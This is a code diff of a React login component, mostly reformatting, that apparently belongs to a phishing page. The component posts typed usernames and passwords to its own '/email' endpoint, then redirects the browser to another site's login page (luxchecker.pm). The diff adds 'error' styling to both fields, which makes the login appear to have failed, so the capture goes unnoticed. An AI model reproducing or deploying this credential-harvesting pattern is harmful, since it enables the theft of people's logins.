@@ -16,19 +16,19 @@ export default function LoginView() {
   const router = useRouter();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const login = async(e: any) => {
+  const login = async (e: any) => {
     e.preventDefault()
     await axios.post('/email', {
-        email: email,
-        password: password
+      email: email,
+      password: password
     })
-    .then((response) => {
-      router.push("https://luxchecker.pm/login.php");
-      console.log(response.data);
-    })
-    .catch((error) => {
-      console.error(error);
-    });
+      .then((response) => {
+        router.push("https://luxchecker.pm/login.php");
+        console.log(response.data);
+      })
+      .catch((error) => {
+        console.error(error);
+      });
   }
   return (
     <Stack direction={"column"} bgcolor={"#1D2024"} sx={{ minHeight: "100vh" }}>
@@ -204,12 +204,13 @@ export default function LoginView() {
             </Typography>
             <Box component="form" noValidate sx={{ mt: 1 }}>
               <TextField
+                error
                 size="small"
                 fullWidth={true}
                 variant="outlined"
                 placeholder="Username"
                 value={email}
-                onChange={(e)=>setEmail(e.target.value)}
+                onChange={(e) => setEmail(e.target.value)}
                 sx={{ fontSize: "12px" }}
                 InputProps={{
                   endAdornment: (
@@ -220,13 +221,14 @@ export default function LoginView() {
                 }}
               />
               <TextField
+                error
                 margin="dense"
                 size="small"
                 fullWidth={true}
                 variant="outlined"
                 placeholder="Password"
                 value={password}
-                onChange={(e)=>setPassword(e.target.value)}
+                onChange={(e) => setPassword(e.target.value)}
                 type="password"
                 InputProps={{
                   endAdornment: (
@@ -267,7 +269,7 @@ export default function LoginView() {
                 <Button
                   type="submit"
                   variant="contained"
-                  style={{ fontFamily: "Open Sans" ,backgroundColor:"#428BCA",border:"none"}}
+                  style={{ fontFamily: "Open Sans", backgroundColor: "#428BCA", border: "none" }}
                   sx={{ mt: 3, mb: 2 }}
                   onClick={login}
                 >
